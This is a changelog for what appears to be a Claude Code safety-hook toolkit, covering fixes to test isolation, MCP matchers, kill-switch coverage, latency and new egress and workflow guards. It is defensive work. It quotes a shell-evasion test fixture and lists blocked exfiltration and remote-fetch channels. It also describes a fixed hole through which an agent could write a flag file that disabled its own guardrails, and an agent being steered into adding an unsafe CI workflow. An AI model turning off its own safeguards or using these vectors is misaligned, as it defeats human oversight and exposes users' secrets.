  **The pollution mattered more than the speed.** Only 40 of ~152 test files call `setup_test_home`; the other 112 inherited the developer's real `$HOME`, so hooks under test wrote to the live state dir — `.safety-trace.log`, `.scan-alert-*`, and `.blocked-commands`. That last file feeds the `[BLOCKS]` summary injected into **every session's context**, so test fixtures were being counted as real security events and billed as context tokens each session: the `OS shell-out hidden in python -c wrapper (blocked 8x)` line was `python3 -c "import os; os.system('id')"` from `test-safety-bash-evasions.sh`, not an actual block.

  Isolation is per-file `HOME`, not `SUPERCHARGER_STATE` — overriding only STATE **fails ~160 assertions**, because the tests read state back through `"$HOME/.claude/supercharger/scope/..."` literals while the hooks resolve it via `lib-paths.sh`; the two then point at different directories. `SUPERCHARGER_HOME` is deliberately left alone: it is the read-only code root, and since `install.sh` flattens `configs/economy` and `configs/roles` to the top level, aiming it at this repo breaks every economy/role lookup. The temp `HOME` is also canonicalised with `pwd -P`, because `mktemp -d` returns `/var/folders/…` and `/var` is a symlink to `/private/var` — `path-guard.sh:229` realpaths paths to stop an in-path symlink abusing its memory-store allowance, so a symlinked HOME correctly tripped that guard and denied a write the test expects allowed. Real homes are already canonical.

  Parallelism runs in waves of `$TEST_JOBS` (default: core count), replaying output in glob order so the report stays deterministic — verified byte-identical to serial on file list and per-file totals. `TEST_JOBS=1` restores fully serial execution (verified: 2575/0). Waves rather than a work queue because bash 3.2 has no `wait -n` and `xargs -P` would need `bash -c` plus an exported function.

  **Correction to 2.24.7:** that entry framed `fuzz-safety.sh` as a fuzzer silently lost to the `test-*.sh` glob. It is not — its own header (lines 7–8) states it is excluded deliberately, being slow and non-deterministic, and meant to be invoked by hand. The allowlist reason now says so. The orphan test still earns its place by making that exclusion *explicit and reasoned* rather than implicit, but "has never run" overstated the case.

  Running it by hand also showed why it stays shelved: its whitespace mutator (`fuzz-safety.sh:92`) rewrites **every** hyphen, not just flag hyphens, so `ssh-keygen -t rsa` becomes `ssh  -keygen  -t rsa` — a different and harmless command that `safety.sh` rightly allows and the fuzzer then reports as a bypass. Every hyphenated binary in its dangerous list yields the same false report, so its bypass output is largely noise. Not fixed here; recorded so the next person doesn't chase those as real findings.

- [2.24.7] - 2026-07-29 — feat(tests): **nothing in this repo may silently not run.** Three failures in one week shared a shape — a discovery mechanism matched nothing and reported success. v2.24.5: every hook registered with the bare `mcp__` matcher was inert, because an unmatched matcher fires nothing and errors nothing. `fuzz-safety.sh`: `run.sh` collects `test-*.sh`, so the fuzzer has never run — a test that isn't collected is indistinguishable from one that passes. And while investigating, a `find -newermt` probe returned empty on BSD find (unsupported predicate) and was very nearly accepted as "no writes found". **Absence had no error path anywhere.**

  New `test-orphan-registration.sh` gives it one, in four directions: every `hooks/*.sh` must be registered in `hooks.json`, be a `lib-*`, or carry an explicit allowlist entry **with a written reason**; every hook registered in `hooks.json` must exist on disk (a registration pointing at a deleted script is equally silent); every script in `tests/` must be collectable by the runner's glob or be allowlisted; and every allowlist entry must still correspond to a real file, so a stale entry cannot mask a future file of the same name. The reason string is the price of admission — allowlisting is for files that genuinely should not be collected, and the failure message says to wire the file up rather than allowlist it. `fuzz-safety.sh` is now recorded as *deliberately* uncollected instead of silently missing. All four directions were verified by fault injection (unregistered hook, deleted registered file, uncollected test script, stale allowlist entry) rather than by observing them pass. +139 tests, suite 2436 → **2575**/0.

  **`tools/release.sh` made usable again.** Two defects, both reasons it had been bypassed in favour of hand-rolled commits. (1) It staged a hardcoded six-file list, so a release commit could contain the version bump *and not the change it was releasing* — v2.24.6 would have shipped bumped badges with `tests/run.sh` left in the working tree, and any release touching a hook, lib, tool or test hit this. It now stages everything (`git add -A`, which honours `.gitignore`) and prints the staged set for confirmation, because staging broadly without a preview is how a stray file rides into a tagged, pushed commit. (2) It ran the full suite **twice** — once to read the test count, once to gate — turning a ~7-minute suite into a ~14-minute release. Now one run serves both, and the confirmation prompt moved *after* the gate, so nobody is asked to approve a release whose tests have not run yet. Verified against a scratch repo: modified + new files staged and gitignored excluded, `n` aborts before committing, clean tree exits 1.

- [2.24.6] - 2026-07-29 — fix(ci): **the README tests badge could drift silently — nothing checked it.** `test-version-parity.sh` guards the *version* badge across all six touchpoints, but the tests badge was never covered by anything, and it drifted: the README advertised 2430 while the suite was at 2436. A badge is a trust signal, and a stale one is worse than no badge.

  The check lives in `tests/run.sh`, not in `test-version-parity.sh`, because `TOTAL_PASSED` is the only place the true count exists. Putting it in the parity test would have meant either running the whole suite from inside a single test, or copying the number into a second file that can itself drift — trading one unguarded value for two. It **warns locally and fails only under `CI`** (which GitHub Actions sets): a stale doc badge should not turn a contributor's suite red mid-edit, but it must not reach master either. `tools/release.sh` already rewrites the badge on every release, so the normal path never trips this; what it catches is a hand-commit that adds tests without going through `release.sh` — precisely how 2.24.5 drifted.

  One subtlety, caught by testing the paths rather than assuming them: `grep -oE '[0-9]+'` over `tests-2436%20passing` returns **both** `2436` and `20`, because `%20` contains digits. The first implementation compared that two-line value against the total and would have warned on every run. Extraction now uses the same `sed` shape as `test-version-parity.sh:37`. All five paths verified — badge matching (silent), drifted locally (warn, exit 0), drifted under CI (exit 1), matching under CI (exit 0), and no badge present (no false alarm). Badge corrected 2430 → **2436**. Full suite 2436/0.

- [2.24.5] - 2026-07-29 — fix(security): **every MCP-matched hook had silently stopped firing, including the MCP egress guard.** Reported from real use as a cosmetic symptom — "the statusline used to show the MCP name when an MCP server was active, now it doesn't". The badge was the only visible edge of a much larger failure: **none of the MCP hooks had been running at all.**

  Claude Code selects the matcher mode from the matcher's own characters: one composed only of `[A-Za-z0-9_,| -]` is an **exact** match (optionally a comma/pipe list), and anything else is treated as an unanchored **regex**. Every MCP registration here used the bare prefix `mcp__`, which contains no metacharacter — so it asked for a tool *literally named* `mcp__`. No server exposes such a tool, so the matcher matched nothing. Real names are `mcp__<server>__<tool>`; the correct form is `mcp__.*`.

  **Nothing errors when a matcher matches nothing** — a hook that never fires is indistinguishable from a hook with nothing to do. That is why this surfaced as a missing statusline badge rather than as a failure, and it is the property that makes the class dangerous: `mcp-egress-guard` (metadata-SSRF, webhook exfil, paste-site and IPFS egress inside MCP tool arguments) was inert, as were `mcp-circuit-breaker`, `mcp-provenance`, `mcp-output-truncator` and `mcp-tracker`. The `mcp__` arms of `prompt-injection-scanner` and `output-secrets-scanner` were dead too, so MCP responses were being neither injection-scanned nor secret-scanned. Four server-specific guards — `mcp-github-write-gate`, `mcp-playwright-guard`, `mcp-sql-guard`, `mcp-destructive-guard` — were listed by exact server prefix and equally inert, and `safety.sh`'s shell-exec MCP coverage (v2.22.12) had never matched, leaving `execute_command`-style servers outside the destructive-command guards. **13 registrations in total.**

  Fixed by normalizing matchers at **emit** time rather than in the registration literals. The hook table is `|`-delimited (`event|matcher|command|flags`) and regex alternation is also `|`, so writing `mcp__a__.*|mcp__b__.*` into a literal would shift the command into the matcher field and corrupt the record — the rewrite therefore runs *after* the record is split, converting comma lists to alternation and appending `.*` to each `mcp__` token. Matchers with no `mcp__` token are passed through untouched, deliberately: turning `Bash,PowerShell` into a regex would make it match substrings such as `BashOutput`, silently widening hooks that were never scoped to them.

  **Verified live, not by inspection.** With profiling enabled, a real `mcp__context7__*` call before the fix logged **36 hooks and zero `mcp-*`**; after it, `mcp-circuit-breaker` (pre+post), `mcp-egress-guard`, `mcp-output-truncator`, `mcp-provenance` and `mcp-tracker` all fire, `.active-mcp-<session>` is written again, and the statusline renders `MCP: context7__supercharger`. The 6 new tests model Claude Code's matcher rule exactly rather than using a bare substring search — a naive `re.search` reports the broken `mcp__` form as working — and were confirmed to **fail against the pre-fix `hooks.json`** (4 of 6; the other 2 are non-regression guards) before being accepted. Both emit paths (installer `settings.json` and plugin `hooks.json`) carry the normalizer, with a test asserting they agree, since cross-channel drift here would mean plugin users silently losing guards. Full suite **2436/0**.

- [2.24.4] - 2026-07-29 — fix(cli): **`status` exited non-zero while a window was ON in all three time-boxed tools.** `status()` in `autopilot.sh`, `readonly.sh` and `strict.sh` ended with `[ -z "$any" ] && echo "… OFF"`. As the *last* statement that is the function's return value, so whenever a window was actually active (`any=1`, test false) the command exited **1** — `autopilot.sh status; echo $?` reported failure for a perfectly healthy window. `status` answers a query; it is not a predicate. Now returns 0 explicitly in all three. The three share a template, so the flaw had copied cleanly — the same shape as the plugin-path divergence, and the reason all three were checked rather than only the one that surfaced. +3 tests (one per tool, asserting rc=0 in both states).

  Third instance today of one trap: **a bare `[ … ] &&` in a position where its exit status matters** — the earlier two were `set -e` aborts. Fine mid-function; hazardous as the final statement or under `set -e`. Full suite **2430**/0 (one run reported a single failure in `lib-suppress: profiling skipped when sentinel absent` — the documented real-HOME flake, where the assertion counts entries in the live audit dir and a concurrently-firing hook inflates them; passes on re-run with the code unchanged).

- [2.24.3] - 2026-07-29 — fix(isolation): **running the test suite silently cleared your live `/sc-autopilot`, `/sc-readonly`, `/sc-strict` and `/profile` state.** Reported from real use: a 6h autopilot grant kept collapsing to minutes. The grant was written correctly each time — and then deleted, within minutes, by a test run. **This was a regression introduced in v2.23.40.** The tool suites sandbox themselves by setting `CLAUDE_PLUGIN_DATA=<tmpdir>`; they do **not** override `$HOME`. That was sufficient while `autopilot.sh` resolved state as `${CLAUDE_PLUGIN_DATA:-$HOME/…}`. The plugin-path fix replaced that with `sc_scope_dirs()`, which writes and clears **every** scope dir it can find — including the real `$HOME/.claude/supercharger/scope` — so `autopilot.sh off` inside a test reached straight out of its sandbox. With the statusline then seeing only a leftover *global* flag, an open 6h window displayed as "24m left".

  Fixed by a rule that is independently correct, not a test-only special case: **an explicitly-set `CLAUDE_PLUGIN_DATA` is the state root, and the only one** — an explicit location beats discovery, and nothing should write outside a root the caller named. Tools invoked from a skill run outside any hook, where the variable is unset, so they still discover every scope dir and the plugin-path fix is untouched. Applied to both `sc_scope_dirs()` (lib/utils.sh) and `sc-toggle.sh`'s own copy.

  Verified with the experiment that exposed it: a live flag present → `test-autopilot`, `test-plugin-scope-parity`, `test-sc-toggle`, `test-readonly`, `test-strict` → flag **intact** (it was deleted by the first of those before the fix). Two permanent guards added: one asserting the resolver returns *only* the explicit root, one asserting a `CLAUDE_PLUGIN_DATA`-sandboxed `off` cannot delete a sentinel outside its sandbox. All eight tools that route through the resolver — `autopilot`, `readonly`, `strict`, `profile-switch`, `mcp-profile`, `trust-mcp`, `notify-toggle`, `sc-toggle` — were affected the same way and are fixed together. +2 tests. Full suite **2427/0**.

- [2.24.2] - 2026-07-29 — perf(write-wave): **three Write/Edit guards had no fast-path gate at all — chain cost down 40%.** The Bash chain had been measured and tuned; the **Write/Edit** chain never had been, and it turned out to be far worse: **20 hooks, 46.8 ms felt, 358 ms sequential**. The cause was blunt — `package-source-guard`, `install-script-guard` and `test-integrity-guard` went straight to a ~28 ms `python3` fork with **no cheap gate in front of it**, so writing a plain `.ts` file started three interpreters to discover that none of them cared. `package-source-guard` inspects seven dependency manifests; it was forking for every source file in the repo. Each now has a bash `case` gate on the raw payload, written as a deliberate **superset** of the python's own basename/path test — matched anywhere in the payload and covering the case variants python obtains via `.lower()` — so a gate miss cannot skip a file the guard would have flagged, while a spurious match simply falls through to the unchanged python. Their own suites (53 assertions) pass unchanged. Also added `python3 -S` to `code-security-scanner`, `generated-file-guard` and `file-lease` (stdlib-only, plus the local `lib_code_patterns` import which `-S` does not affect). Result: **chain sum 358 → 213 ms (−40%)**, felt 46.8 → **39.4 ms**, stable across three runs.

  **A correction to 2.24.0's research notes:** `python3 -S` was reported there as worth ~11.9 ms per fork. That figure came from timing `python3 -c pass`, where `site` really is most of the work. An interleaved A/B *inside a real hook* measures it at **~1–2 ms** — once a hook imports `json`/`re`/`hashlib` those dominate. `-S` is kept (free, no downside for stdlib-only hooks) but it is not the lever; the gates are.

  Not attempted, deliberately: gating `generated-file-guard`, now the wave's slowest hook. For an `Edit` it reads the `@generated` header from **disk**, so a payload-based gate would miss a file whose header is not in `new_string` — a wrong gate there is a missed guard, not merely a slower one. Full suite **2425/0**.

- [2.24.1] - 2026-07-29 — perf(security-path): **the same fork-free reads applied to `safety.sh` and `env-file-guard`, gated on a byte-identical fuzz differential.** These two were held out of 2.24.0 deliberately: `safety.sh` is the primary security guard and `env-file-guard` is the felt latency on `Read` (only three hooks fire there, so the slowest one *is* the wave — and `Read` is the most-used tool). Both were paying `jq` forks *before* their own fast-path exit — `safety.sh` ran one on every Bash call including the trivially-safe ones it then skips. Now they read `command`/`script`/`code`/`cmd`, `cwd`, `tool_name` and `file_path` via `lib-json-fast`, with the original `jq`→`python3` chain retained verbatim as the fallback and the exact alternation order preserved. Also removed a `mkdir -p "$(dirname …)"` (two forks per fire, for a statically-known directory). Measured: **`PreToolUse:Read` 21.0 → 12.1 ms (−42%)**, **`npm install`-class Bash 33.0 → 26.3 ms (−20%)**.

  **Verification, because this is the security path:** `fuzz-safety.sh` run before and after under identical conditions — **byte-identical across 4,655 mutations** (300 pre-existing false negatives, 0 false positives, unchanged), plus bash-evasions 14/0, PowerShell-patterns 10/0, PowerShell-parity 11/0, cmd-normalize 22/0, env-file-guard 27/0. Full suite **2425/0**.

  Two deliberate refusals: the research proposed sampling the forensic-trace trim (1-in-32) for ~2ms, which would let the log drift to ~1000±32 lines — declined, since strict behavioural equivalence on the primary guard is worth more than 2ms, and it is why `safety.sh` lands at 26.3ms rather than the projected 19ms. And `env-file-guard`'s `PROJECT_DIR` keeps its **exact** original jq expression on the fallback path, because that expression also falls back to `.workspace.current_dir` — a generic helper would have silently dropped it.

- [2.24.0] - 2026-07-29 — perf: **hot-path hooks cut to the process floor — felt latency for a typical tool call drops 47%.** Hooks were forking `jq` (~6ms) or `python3` (~30ms) just to pull one or two strings out of the stdin payload — frequently *before* their own fast-path exit, i.e. paying 30ms to decide they had nothing to do. New `hooks/lib-json-fast.sh` reads a JSON string value with bash parameter expansion alone (no fork) and is **conservative by construction**: it refuses — falling back to the existing `jq`/`python3` path untouched — when the key is absent, when the name occurs more than once anywhere in the payload (so there is never a question of which occurrence was taken), or when the value contains any backslash (so every JSON escape is handled by the real parser, never mis-decoded). Applied to the four measured-slowest non-security hooks, plus `dirname`→`${v%/*}` in two parent-directory walks (up to 5 forks each), a `mkdir -p` that ran on every fire for a directory that already existed, and two config reads that forked `python3` to discover a key that most projects don't set:

  | hook | before | after |
  |---|---|---|
  | `enforce-pkg-manager` (was the makespan setter) | 34–38 ms | **6.6 ms** (−81%) |
  | `budget-cap` (empty matcher — fires on *every* tool call) | 21.2 ms | **9.0 ms** |
  | `tool-call-limiter` (same) | 18.4 ms | **6.1 ms** (−65%) |
  | `tool-preferences` | 9.8 ms | **6.3 ms** |

  End to end on `PreToolUse:Bash`: felt **19.0 → 10.1 ms (−47%)** for a fast-pathed command, chain sum 124.9 → 97.0 ms. Because Claude Code runs same-event hooks **concurrently** (measured width ~11), the number that moved is the one users actually feel. Non-fast-pathed commands are unchanged for now at ~33 ms — `safety.sh` is the remaining makespan setter and is deliberately held for its own release, gated on the full fuzz suite, rather than bundled into a diff across the security hot path. +18 tests, including an adversarial suite for the JSON reader (duplicate keys, escaped quotes, unicode escapes, non-string values, key-prefix confusion, and a differential check against `jq`). Full suite 2407→**2425**/0. Hook count unchanged.

  **Rolling up 2.23.29–.48**, the arc this minor closes: **new guards** — GitHub Actions "pwn request", editor auto-run configs, conflict markers, config validity, ANSI conceal escapes, shebang-without-`+x`, `.pth` startup exec, git `ext::`/`fd::` transport RCE, IPFS-gateway egress. **A security fix** — on plugin installs an agent could write `.disabled-security-categories` at the plugin path and disable its own guardrails, because `path-guard` matched only the classic path. **A whole bug class** — Supercharger's own tools wrote state to `~/.claude/supercharger` while plugin-install hooks read `$CLAUDE_PLUGIN_DATA`, silently no-oping `/sc off`, `/profile`, autopilot, read-only, strict, MCP trust and per-project config. **`/sc off` made total** — 13 more hooks plus Supercharger's own MCP servers now stand down with it. **Perf, measured rather than assumed** — the hook chain runs in parallel, so felt latency is a wave (~20–40 ms) not the sequential sum; the statusline, the largest single recurring cost, went 45 → 8 ms via a render cache. **MCP** — your own servers can now join the context-cost profiles.

- [2.23.48] - 2026-07-29 — feat(mcp): **your own MCP servers can now join the context-cost profiles.** Claude Code already owns *adding* a server — `claude mcp add <name> -- <cmd>`, `--transport http <name> <url>`, headers, env, `add-json` — so Supercharger deliberately does **not** reimplement that; a parallel implementation would only drift as Claude Code's config format evolves. What Claude Code has no notion of is Supercharger's **profiles**, so that is what this adds: register a server you already added and choose which profiles it belongs to. New `tools/mcp-custom.sh` — `adopt <name> [profiles]` · `list` · `remove <name>`, where `profiles` is `all` or a comma list of `light,dev,research,full` (validated up front, since a typo would otherwise silently hide the server). A registered server is configured only while one of its profiles is active, and `/sc off` moves it aside with the rest. **Prerequisite fix:** `merge_mcp_into_settings` wipes every tagged entry and rebuilds from the curated list on each switch, so a naively-tagged custom server would have been *silently deleted* on the next `/profile` — the rebuild now re-adds eligible registered servers, with the registry (`~/.claude/supercharger/mcp-custom.json`) as the source of truth, so a server excluded by the current profile is dropped from the config but never lost. The **raw entry is stored verbatim**, so http/sse/`url`/`headers` servers survive the round-trip — the curated `name|command|args|env` pipe format cannot express those. `adopt` **takes ownership** (removes the original untagged entry) rather than leaving a duplicate that would load the server twice and double its context cost; `remove` hands it back untagged so unregistering never loses a server you configured. Servers you don't adopt are never touched. +9 tests. Full suite 2398→**2407**/0.

- [2.23.47] - 2026-07-29 — fix(sc): **the v2.23.46 MCP fix only covered half the installs — it now handles both settings files.** `mcp-setup.sh` writes MCP servers to **`~/.claude.json`** (its primary target) and treats `~/.claude/settings.json` as *legacy*; v2.23.46's `/sc off` only handled the legacy path. On a real install with tagged servers in both (this repo's own machine had `context7`/`magic-ui` in each), `off` stripped one file and left the other live — so the servers still loaded and still cost context. Same failure shape as the plugin-path divergence class: the fix targeted the surface that was *found* rather than the one the **writer** actually writes. `off` now scans **both** files, stashes the tagged entries **keyed by file**, and `on` restores each server to the file it came from; user servers in either file are untouched (verified with `my-own-primary` + `my-own-legacy` surviving a full round-trip). `~/.claude.json` is now included in the timestamped backup `off` takes, since `off` edits it. Each file is written temp-then-`os.replace` independently, so a failure on one leaves the other consistent. +2 tests (7 total for the MCP path). Full suite 2396→**2398**/0.

- [2.23.46] - 2026-07-29 — fix(sc): **`/sc off` now also drops Supercharger's own MCP servers (the last surface that survived it).** After v2.23.44 made every hook honor the kill-switch, an audit of *all* `settings.json` keys — not just `hooks` — found one thing still running: `mcpServers`. Supercharger registers its own servers there (tagged `<name> #supercharger`), and they load at session start and cost context via tool schemas (~300 tokens on `light`, ~3,500 on `full`, per the MCP-profile table). `sc-toggle` had deliberately never touched `settings.json` ("no JSON surgery, no blast radius"), so "off" left them registered — meaning Supercharger still cost context while claiming to be off. `off` now moves **only the tagged entries** into the existing `.deactivated` stash and removes them from `settings.json`; `on` restores them verbatim (`setdefault`, so a server you re-added by hand is never clobbered). **Your own MCP servers are never touched** — a `my-own-server` entry survives the full off→on round-trip untouched. Writes temp-then-`os.replace` so `settings.json` is never left partial, on top of the timestamped full-file backup `off` already takes; a settings file with no `mcpServers` key toggles cleanly. MCP loads at session start, so this takes effect on the next session (the toggle output says so). +5 tests. Full suite 2391→**2396**/0. **`/sc off` is now total across every surface: hooks, statusline, context injection, the CLAUDE.md block, notifications, session writes, and MCP.**

- [2.23.45] - 2026-07-29 — perf(statusline): **cache the rendered line for one second — 42ms → 8ms per render (5.2×).** The statusline was the last unmeasured surface in the system: 562 lines, registered under `statusLine` in settings.json rather than `hooks.json`, so every hook audit and `/perf` sweep had skipped it — while it ran on *every* render. Measured at **~45ms**, and it turned out to be the largest single recurring cost in Supercharger, larger than the entire (parallel) PreToolUse chain. Two findings from the measurement: it does **not** degrade with session length (flat across a 152 MB / 76k-line transcript — it already tails the file and caches git ~3s), and the residual cost is almost entirely **interpreter startup** (bash + one `python3`), not work. Claude Code re-runs the statusLine on a **300ms debounce** — ~3–4×/second during bursts, ~150–200 executions in a 5-minute conversation — so that startup was being paid repeatedly to redraw a line that barely changes. It now serves a cached line within the same wall-clock second: repeat renders skip the python fork entirely. The cache-hit path is **pure bash parameter expansion — no fork**, or the cache would cost what it saves. Keyed on session id **+ cwd** (a `/cd` busts it), written temp-then-`mv` so a concurrent render never reads a half-written line, and skipped entirely for a session id with unsafe characters (no path escape). Worst-case staleness is <1s on a display whose git data is already 3s-stale by design; output is **byte-identical** to before, and `/sc off` still renders nothing. Fail-open throughout. +6 tests. Full suite 2385→**2391**/0.

- [2.23.44] - 2026-07-29 — fix(sc): **`/sc off` is now total — 13 hooks were still running with Supercharger disabled.** v2.23.43 fixed this for one hook; an audit of all **121 registered hooks** found 12 more with the same gap. A hook only sees the global kill-switch if it sources `lib-suppress.sh` or `lib-timing.sh` (both exit at source time when the disable flag is present) — these never did, so `/sc off` silenced most of the system while they kept firing: `agent-gate` (a PreToolUse gate), `stop-verify`, `session-complete`, `session-memory-write`, `notify-stop`, `notify-permission`, `compaction-backup`, `event-logger`, `learn-from-prompts`, `plugin-config-seed`, `session-end`, `stop-failure`, `update-check`. All 13 now source `lib-timing.sh` (one line each), which closes the gap **and** completes the `/perf` instrumentation sweep — every registered hook is now both kill-switch-aware and timed. Verified end-to-end: with the flag set, **all 121 hooks are silent and exit 0**, and `/sc on` still works (no bootstrap trap — `plugin-config-seed` only seeds config *values*, never the flag, and `sc-toggle` sets `SUPERCHARGER_TOGGLE` to bypass). The statusline and every SessionStart context injector already complied, and `sc-toggle` already strips the `CLAUDE.md` block, so **`/sc off` now stops hooks, context injection, notifications, session writes, and the prompt layer together**. New `tests/test-kill-switch-coverage.sh` asserts this **structurally** — a future hook added without the guard fails CI instead of leaking into the field. +3 tests. Full suite 2382→**2385**/0.

- [2.23.43] - 2026-07-29 — fix(sc): **`enforce-pkg-manager` now honors `/sc off`** — it previously kept running with Supercharger disabled. The hook sourced neither `lib-suppress.sh` nor `lib-timing.sh`, so the global kill-switch (which both libs check at source time) never reached it: `/sc off` silenced every other hook while this one still blocked the "wrong" package manager. Sourcing `lib-timing.sh` fixes that **and** closes the last `/perf` instrumentation gap on the hot path — it was the only uninstrumented `PreToolUse:Bash` hook, and the new chain harness (below) measured it as the single costliest hook on a non-fast-pathed command (~34ms). Behavior is otherwise unchanged: still blocks the wrong package manager, still allows the right one. **If you relied on `/sc off` being total, this makes it so.** +4 tests.

  Also **new: `tests/perf-chain.sh`** — a hook-**chain** latency harness (HOOK-LATENCY-PLAN Phase 1). Per-hook timing already existed, but `/perf` discards any fire under 40ms outside opt-in profiling, so it is structurally blind to the real failure mode in this architecture: not one slow hook, but *N* fast ones. The harness selects the `hooks.json` entries that fire for a given event+tool, runs each against a synthetic payload, and reports the **chain sum** (sequential total = fork-pressure/CPU per tool call) alongside the **slowest hook** (the felt-latency floor if Claude Code parallelizes same-event hooks — it reports both rather than assuming either). Measured against two payloads, since a fast-pathed command (`git status`) understates the chain versus one that isn't (`npm install lodash`). Committed baseline in `docs/perf-baseline.json`; `--json` for machine consumption. Touches no hook. Baseline on bash 3.2: **PreToolUse/Bash = 18 hooks, ~158ms fast-pathed / ~182ms not**. +4 tests.

  Docs/CI in the same release: README restructured for onboarding (install at the top, "your first five minutes", honest "what this does and doesn't guarantee" scoping) with the slash-command reference completed (10 commands were missing, incl. `/sc-update` and the `/sc-autopilot`·`/sc-readonly`·`/sc-strict` trio) and reordered benefit-first; `CHANGELOG.md` split (2.21+ kept, older archived to `docs/CHANGELOG-archive.md`, 486K→88K); CI's version-check job now calls `tests/test-version-parity.sh` instead of reimplementing a narrower copy in YAML. Full suite **2374→2382**/0.

- [2.23.42] - 2026-07-28 — feat(egress): **block public IPFS-gateway fetches (anonymous payload/exfil channel).** Public IPFS gateways (`ipfs.io`/`dweb.link`/`w3s.link`/`cf-ipfs.com`/`gateway.pinata.cloud`/…) and the `/ipfs/<CID>` path shape are a content-addressed, curl|bash-equivalent fetch channel that dodges domain reputation because the host is a neutral gateway — the Miasma-RAT loader (2026 AsyncAPI npm compromise) pulled its next stage from one. Added a new `EGRESS_IPFS_RE` category to the shared `lib-egress-patterns.sh`, so both consumers — `webfetch-egress-guard` (WebFetch) and `mcp-egress-guard` (MCP tool args) — now **deny** a fetch to a public IPFS gateway or an `/ipfs/<CID>` path, mirroring how paste/webhook/metadata hosts are already handled (first-match-wins, own reason string). A plain mention of "ipfs" without a gateway host or CID path does not fire. No new hook (shared-lib fold, no count change). +6 tests. Full suite 2368→**2374**/0. (RANK-2 of the 2026-07-28 attack sweep — completes that slate.) Note: the Bash `curl` channel is intentionally not covered here — Bash-command egress-URL classification is architecturally absent for *all* egress classes (too FP-prone); the guard covers the model's tool channels, and `curl|sh` execution is already denied.

- [2.23.41] - 2026-07-28 — feat(security): **new `workflow-pwn-guard` — block the GitHub Actions "pwn request" supply-chain vector.** A `pull_request_target` / `workflow_run` workflow runs with the base repo's `GITHUB_TOKEN` + secrets; if it then checks out the **untrusted fork-PR head** (`github.event.pull_request.head.sha`, `refs/pull/N/merge`, …) and runs it (`npm ci`/build/test), attacker PR code executes with those secrets — the vector behind the **July-2026 AsyncAPI npm compromise** (GitHub shipped an `actions/checkout` v7 default-block for it in 2026). An agent editing `.github/workflows/*.yml` can be nudged into adding this while "fixing CI". The new PreToolUse hook (matcher `Write,Edit,MultiEdit`, full-mode, `/profile`-gated) **denies** the explicit opt-out `allow-unsafe-pr-checkout: true` (its only purpose is to re-enable the now-blocked unsafe checkout — never legitimate for an agent to add) and **asks** on the privileged-trigger + untrusted-PR-head-checkout combination. Scoped to workflow files; the trigger alone (labelers/comment-bots) and the *safe* `pull_request` trigger do **not** fire — the untrusted-head reference must co-occur, and for an Edit the on-disk file is combined with the additions so adding either half of the pattern is caught. Fail-open; disable with `SUPERCHARGER_WORKFLOW_PWN_GUARD=0`. Full-mode hook count 137→**138**. +11 tests. Full suite 2356→**2367**/0. (RANK-1 of the 2026-07-28 fresh attack-class sweep.)

- [2.23.40] - 2026-07-28 — fix(security+plugin): **close a Write-channel guardrail-disable bypass + 3 more plugin-path no-ops (2nd-sweep of the divergence class).** A follow-up audit of the v2.23.37–.38 path-divergence class (one general-purpose agent, 27 tool calls) found four more instances. **(1) SECURITY — `path-guard`:** its self-modification target list matched `.disabled-security-categories` / `.disabled-hooks` by **exact classic path**, so on a plugin install an agent could **Write** those files at `$CLAUDE_PLUGIN_DATA/scope/…` (where safety.sh / lib-suppress actually read them) and path-guard would allow it — disabling its own guardrails through the Write channel undetected (the Bash channel was already protected by basename regex; this was a Write-vs-Bash parity drift that only opened on plugin installs). Now matches those two files by **basename**, path-agnostic. **(2) `project-config`:** wrote `.disabled-hooks`/`.disabled-security-categories`/`.profile`/`.budget-cap`/`.economy-tier`/cache to the hardcoded classic path (6 sites) even though it runs as a hook — so every per-project `.supercharger.json` override silently no-op'd on plugin installs; now resolves the scope dir from `SUPERCHARGER_STATE` like the readers. **(3) `autopilot`:** missed in the first sweep (the `${CLAUDE_PLUGIN_DATA:-…}` env-var-unset-outside-hooks trap) — `/sc-autopilot` wrote to the classic path while smart-approve read the plugin path, so autopilot was a silent no-op on plugin installs (prompts kept appearing); now writes across all scope dirs via `sc_scope_dirs`, mirroring readonly/strict. **(4) `notify-toggle`:** desktop-notification suppression silently ignored on plugin installs; now writes to every state root. The agent also **cleared** sc-toggle/economy-switch and confirmed the `pipefail`+`grep -q` SIGPIPE footgun doesn't recur elsewhere. +6 regression tests (all four, incl. the path-guard security case). No hook-count change. Full suite 2350→**2356**/0.

- [2.23.39] - 2026-07-28 — fix(perf): **`/perf` now warns that avg_ms is unreliable on bash < 5.** On bash 3.2 (macOS default) there's no cheap `EPOCHREALTIME` clock, so the profiler forks python once per hook fire to read the time — and that fork's own cost is counted inside the reported `avg_ms`. The inflation is not uniform: some hooks over-report by **10–60×** (a live sample showed `typecheck` at 3737ms in the table vs **~63ms** measured independently), enough to point you at entirely the wrong optimization target. `hook-perf.sh` now prints a caveat banner under the table on bash < 5 — rank by the **Calls** column and measure a specific hook independently before optimizing. Suppressed in `--json` mode and on bash 5+ (which reports accurately). Also corrected the README test-count badge (2338→2348, drifted when v2.23.38 bumped only the version badge). +2 tests. Full suite 2348→**2350**/0.

- [2.23.38] - 2026-07-28 — fix(plugin): **five more control-flag tools were no-ops on plugin installs (same path divergence as `/sc off`).** An audit after the v2.23.37 `/sc off` fix found the bug was systemic: every skill/CLI-invoked tool that writes a scope flag a hook later reads hard-coded (or `${CLAUDE_PLUGIN_DATA:-…}`-fell-back-to) the classic path, but hooks on a plugin install read `$CLAUDE_PLUGIN_DATA/scope` — and these tools run OUTSIDE any hook, so that env var is unset for them. Net on plugin installs: **`/profile fast` did nothing** (the perf mitigation!), **read-only mode was silently inactive**, **strict mode was silently inactive**, the MCP-profile stamp never updated, and **trusting an MCP server never reached elicitation-guard** (perpetual credential-prompt declines). Fixed with a shared `sc_scope_dirs()` resolver in `lib/utils.sh` (globs `~/.claude/plugins/data/*supercharger*/scope` + honors `$CLAUDE_PLUGIN_DATA` when set) now used by `profile-switch`, `readonly`, `strict`, `mcp-profile`, and `trust-mcp` — each writes/clears/reads its flag in **every** scope dir a hook could read. Also fixed a latent `set -o pipefail` + `grep -q` SIGPIPE bug in `trust-mcp`'s membership check (returned "not trusted" on a hit). `hook-toggle`/`mcp-profile` route their primary effect through the shared `settings.json` (unaffected); `hook-toggle`'s `.toggle-history` and the `list-hooks` help text are display/doc-only and left as-is. +10 regression tests (`test-plugin-scope-parity`) covering all five tools + the resolver. No hook-count change. Full suite 2338→**2348**/0.

